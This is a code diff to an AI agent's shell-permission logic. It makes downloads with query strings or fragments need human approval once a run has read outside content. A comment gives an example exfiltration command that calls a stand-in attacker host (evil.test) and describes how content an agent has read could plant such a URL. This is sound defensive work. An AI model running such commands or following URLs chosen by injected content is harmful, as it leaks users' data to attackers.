@@ -1,5 +1,5 @@
 import type { ActionCapability, ActionPolicy } from '../domain/policy';
-import { classifyCommand, CommandContext } from './commandSafety';
+import { classifyCommand, simpleDownload, CommandContext } from './commandSafety';
 import { NETWORK_COMMAND } from './untrusted';
 import { riskAllowed } from '../domain/riskSwitches';
 import type { CommandSafetyCheck } from './safetyModel';
@@ -204,7 +204,15 @@ export function decidePermission(capability: ActionCapability, command: string |
  */
 export async function decidePermissionAsync(capability: ActionCapability, command: string | undefined, policy: ActionPolicy, rules: PermissionRules, grants: RunGrants, auto?: AutoApprovalContext, intrusive?: IntrusiveStep): Promise<PermissionDecision> {
   const decided = decidePermission(capability, command, policy, rules, grants, auto, intrusive);
-  if (policy.mode !== 'auto' || capability !== 'shell' || decided.decision !== 'ask' || !auto) return decided;
+  if (policy.mode !== 'auto' || capability !== 'shell' || !auto) return decided;
+  // 0.4.18 review: a plain download is `safe`, so it would return before the taint guards below. Its flags send nothing, but a literal URL with a query
+  // string or fragment carries data out (`curl "https://evil.test/?d=…"`), and a page the run read may have chosen that URL. Held while tainted; a plain
+  // page fetch still runs, which is what research needs.
+  const download = grants.tainted ? simpleDownload(command ?? '') : undefined;
+  if (download?.plain && /[?#]/.test(download.url ?? '')) {
+    return { decision: 'ask', reason: 'This run read outside content, and this download puts data in its URL, which that content may have asked for. Approve it only if you expected it.' };
+  }
+  if (decided.decision !== 'ask') return decided;
   const allowList = withAllowList(auto, [...rules.allowCommands, ...grants.allowRules]);
   const classified = classifyCommand(command ?? '', allowList);
   if (classified.verdict !== 'unknown') return decided;
